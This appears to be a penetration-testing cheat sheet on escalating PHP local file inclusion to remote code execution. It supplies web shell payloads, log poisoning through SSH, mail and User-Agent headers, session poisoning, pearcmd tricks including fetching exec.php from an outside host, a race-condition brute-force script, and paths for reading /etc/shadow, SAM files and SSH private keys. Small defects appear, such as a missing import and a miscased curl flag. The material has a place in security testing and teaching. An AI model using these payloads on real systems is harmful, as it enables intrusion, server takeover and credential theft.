# lfi to rce

> lfi (local file inclusion) is a vulnerability that occurs when a web application includes files from the local file system, often due to insecure handling of user input. if an attacker can control the file path, they can potentially include sensitive or dangerous files such as system files (/etc/passwd), configuration files, or even malicious files that could lead to remote code execution (rce).

## summary 

- [lfi to rce via /proc/*/fd](#lfi-to-rce-via-procfd)
- [lfi to rce via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
- [lfi to rce via iconv](#lfi-to-rce-via-iconv)
- [lfi to rce via upload](#lfi-to-rce-via-upload)
- [lfi to rce via upload (race)](#lfi-to-rce-via-upload-race)
- [lfi to rce via upload (findfirstfile)](#lfi-to-rce-via-upload-findfirstfile)
- [lfi to rce via phpinfo()](#lfi-to-rce-via-phpinfo)
- [lfi to rce via controlled log file](#lfi-to-rce-via-controlled-log-file)
    - [rce via ssh](#rce-via-ssh)
    - [rce via mail](#rce-via-mail)
    - [rce via apache logs](#rce-via-apache-logs)
- [lfi to rce via php sessions](#lfi-to-rce-via-php-sessions)
- [lfi to rce via php pearcmd](#lfi-to-rce-via-php-pearcmd)
- [lfi to rce via credentials files](#lfi-to-rce-via-credentials-files)


## lfi to rce via /proc/*/fd

1. upload a lot of shells (for example : 100)
2. include `/proc/$pid/fd/$fd` where `$pid` is the pid of the process and `$fd` the filedescriptor. both of them can be bruteforced.

```ps1
http://example.com/index.php?page=/proc/$pid/fd/$fd
```

## lfi to rce via /proc/self/environ

like a log file, send the payload in the `user-agent` header, it will be reflected inside the `/proc/self/environ` file

```powershell
get vulnerable.php?filename=../../../proc/self/environ http/1.1
user-agent: <?=phpinfo(); ?>
```


## lfi to rce via iconv

use the iconv wrapper to trigger an oob in the glibc (cve-2024-2961), then use your lfi to read the memory regions from `/proc/self/maps` and to download the glibc binary. finally you get the rce by exploiting the `zend_mm_heap` structure to call a `free()` that have been remapped to `system` using `custom_heap._free`.


**requirements**:

* php 7.0.0 (2015) to 8.3.7 (2024)
* gnu c library (`glibc`) <=  2.39
* access to `convert.iconv`, `zlib.inflate`, `dechunk` filters

**exploit**:

* [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)


## lfi to rce via upload

if you can upload a file, just inject the shell payload in it (e.g : `<?php system($_get['c']); ?>` ).

```powershell
http://example.com/index.php?page=path/to/uploaded/file.png
```

in order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf


## lfi to rce via upload (race)

* upload a file and trigger a self-inclusion.
* repeat the upload a shitload of time to:
* increase our odds of winning the race
* increase our guessing odds
* bruteforce the inclusion of /tmp/[0-9a-za-z]{6}
* enjoy our shell.

```python
import itertools
import requests
import sys

print('[+] trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] we have got a shell: ' + url)
        sys.exit(0)

print('[x] something went wrong, please try again')
```


## lfi to rce via upload (findfirstfile)

:warning: only works on windows

`findfirstfile` allows using masks (`<<` as `*` and `>` as `?`) in lfi paths on windows. a mask is essentially a search pattern that can include wildcard characters, allowing users or developers to search for files or directories based on partial names or types. in the context of findfirstfile, masks are used to filter and match the names of files or directories.

* `*`/`<<` : represents any sequence of characters.
* `?`/`>` : represents any single character.

upload a file, it should be stored in the temp folder `c:\windows\temp\` with a generated name like `php[a-f0-9]{4}.tmp`.
then either bruteforce the 65536 filenames or use a wildcard character like: `http://site/vuln.php?inc=c:\windows\temp\php<<`


## lfi to rce via phpinfo()

phpinfo() displays the content of any variables such as **$_get**, **$_post** and **$_files**.

> by making multiple upload posts to the phpinfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the lfi script specifying the temporary file name.

use the script [phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

research from https://www.insomniasec.com/downloads/publications/lfi%20with%20phpinfo%20assistance.pdf


## lfi to rce via controlled log file

just append your php code into the log file by doing a request to the service (apache, ssh..) and include the log file.

```powershell
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```


### rce via ssh

try to ssh into the box with a php code as username `<?php system($_get["cmd"]);?>`.

```powershell
ssh <?php system($_get["cmd"]);?>@10.10.10.10
```

then include the ssh log files inside the web application.

```powershell
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```


### rce via mail

first send an email using the open smtp then include the log file located at `http://example.com/index.php?page=/var/log/mail`.

```powershell
root@kali:~# telnet 10.10.10.10. 25
trying 10.10.10.10....
connected to 10.10.10.10..
escape character is '^]'.
220 straylight esmtp postfix (debian/gnu)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 ok
rcpt to: root
250 2.1.5 ok
data
354 end data with <cr><lf>.<cr><lf>
subject: <?php echo system($_get["cmd"]); ?>
data2
.
```

in some cases you can also send the email with the `mail` command line.

```powershell
mail -s "<?php system($_get['cmd']);?>" www-data@10.10.10.10. < /dev/null
```


### rce via apache logs

poison the user-agent in access logs:

```
$ curl http://example.org/ -a "<?php system(\$_get['cmd']);?>"
```

note: the logs will escape double quotes so use single quotes for strings in the php payload.

then request the logs via the lfi and execute your command.

```
$ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```


## lfi to rce via php sessions

check if the website use php session (phpsessid)

```javascript
set-cookie: phpsessid=i56kgbsq9rm8ndg3qbarhsbm27; path=/
set-cookie: user=admin; expires=mon, 13-aug-2018 20:21:29 gmt; path=/; httponly
```

in php these sessions are stored into /var/lib/php5/sess_[phpsessid] or /var/lib/php/sessions/sess_[phpsessid] files

```javascript
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

set the cookie to `<?php system('cat /etc/passwd');?>`

```powershell
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

use the lfi to include the php session file

```powershell
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```


## lfi to rce via php pearcmd

pear is a framework and distribution system for reusable php components. by default `pearcmd.php` is installed in every docker php image from [hub.docker.com](https://hub.docker.com/_/php) in `/usr/local/lib/php/pearcmd.php`. 

the file `pearcmd.php` uses `$_server['argv']` to get its arguments. the directive `register_argc_argv` must be set to `on` in php configuration (`php.ini`) for this attack to work.

```ini
register_argc_argv = on
```

there are this ways to exploit it.

* **method 1**: config create
  ```ps1
  /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_get['cmd'])?>+/tmp/exec.php
  /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
  ```

* **method 2**: man_dir
  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_get['c']));?>+-s+
  /vuln.php?file=/tmp/exec.php&c=id
  ```
  the created configuration file contains the webshell.
  ```php
  #pear_config 0.9
  a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_get['c']));?>";}
  ```

* **method 3**: download (need external network connection).
  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
  /vuln.php?file=exec.php&c=id
  ```

* **method 4**: install (need external network connection). notice that `exec.php` locates at `/tmp/pear/download/exec.php`.
  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
  /vuln.php?file=/tmp/pear/download/exec.php&c=id
  ```


## lfi to rce via credentials files

this method require high privileges inside the application in order to read the sensitive files.


### windows version

extract `sam` and `system` files.

```powershell
http://example.com/index.php?page=../../../../../../windows/repair/sam
http://example.com/index.php?page=../../../../../../windows/repair/system
```

then extract hashes from these files `samdump2 system sam > hashes.txt`, and crack them with `hashcat/john` or replay them using the pass the hash technique.


### linux version

extract `/etc/shadow` files.

```powershell
http://example.com/index.php?page=../../../../../../etc/shadow
```

then crack the hashes inside in order to login via ssh on the machine.

another way to gain ssh access to a linux machine through lfi is by reading the private ssh key file: `id_rsa`.
if ssh is active, check which user is being used in the machine by including the content of `/etc/passwd` and try to access `/<home>/.ssh/id_rsa` for every user with a home.


## references

* [lfi2rce via php filters - hacktricks - 19/07/2024](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
* [local file inclusion tricks - johan adriaans - august 4, 2007](http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)
* [php lfi to arbitrary code execution via rfc1867 file upload temporary files (en) - gynvael coldwind - march 18, 2011](https://gynvael.coldwind.pl/?id=376)
* [php lfi with nginx assistance - bruno bierbaumer - 26 dec 2021](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
* [upgrade from lfi to rce via php sessions - reiners - september 14, 2017](https://web.archive.org/web/20170914211708/https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)